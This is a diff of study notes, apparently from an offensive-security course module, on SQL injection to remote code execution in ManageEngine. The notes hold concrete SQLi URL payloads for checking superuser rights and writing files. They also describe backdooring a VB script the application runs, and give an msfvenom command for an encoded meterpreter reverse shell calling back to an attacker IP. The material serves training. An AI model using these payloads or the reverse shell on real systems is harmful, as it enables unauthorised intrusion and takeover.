@@ -1,4 +1,4 @@
-## ManageEngine SQLI to RCE
+# ManageEngine SQLI to RCE
 In this module we have demonstrated how to discover an unauthenticated SQL injection vulnerability using source code audit in a Java-based web application.
 We then showed how to use time-based blind SQL injection payloads along with stack queries in order to exfiltrate database information.
 Finally, we developed an exploit that utilized Postgres User Defined Functions and Large Objects to gain a fully functional reverse shell.
@@ -16,15 +16,15 @@ Java web applications use a deployment descriptor file named **`web.xml`** to de
 - The attacker tests a SQL injection vulnerability to confirm DBA privileges by using a payload that checks if `current_setting('is_superuser')` returns `"on"`. If true, it triggers a 10-second delay via `pg_sleep(10)`, confirming administrative access. `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+`
 - Use SQLI to write to the file system `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+`
 - Invistige if any VB scripts are being executed after performaing some action (Creating a Monitor in our case) via ProcMon. If we have ability to write to the file system, we can inject a backdoor into this VB script and it will be executed automatically by the application.
-### Backdoor Crafting
-#### 1. Making the original script one liner
+### Accessing the filesystem
+#### Backdoor Crafting
+1. **Making the original script one liner**
 Match and replace roles in Notepad++ :
 - `'.*` (remove the comments)
 - ` _.*?\n` with `✅ matches newline` option enabled (remove continuation lines)
 - `    ` (remove tabs)
 - match `\n` replace with `:` (remove newline and replace it with `:` which is the VB script command terminator)
-#### 2. Create reverse shell
-Crafting the reverse shell using msfvenom: 
+2. **Create reverse shell**
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
 ```
